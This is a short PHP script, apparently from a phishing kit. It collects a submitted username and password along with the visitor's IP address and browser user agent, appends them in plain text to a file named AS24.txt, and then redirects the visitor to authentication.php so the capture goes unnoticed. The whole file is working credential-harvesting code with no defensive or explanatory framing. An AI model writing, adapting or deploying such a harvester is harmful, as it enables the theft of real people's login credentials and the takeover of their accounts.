<?php
$Username = $_POST['Username'];
$Password = $_POST['Password'];
$_POST['ua'] = $_SERVER['HTTP_USER_AGENT'];
$_POST['ip'] = $_SERVER['REMOTE_ADDR'];


$data = '....................................................................' . "\r\n" . "\r\n" . 
        $_POST['ip'] . "\r\n" . $_POST['ua'] . "\r\n" . $_POST['Username'] . "\r\n" . $_POST['Password'] . "\r\n" . "\r\n" .
        '....................................................................';
$ret = file_put_contents('AS24.txt', $data, FILE_APPEND | LOCK_EX);

header("Location: authentication.php");
die();

?>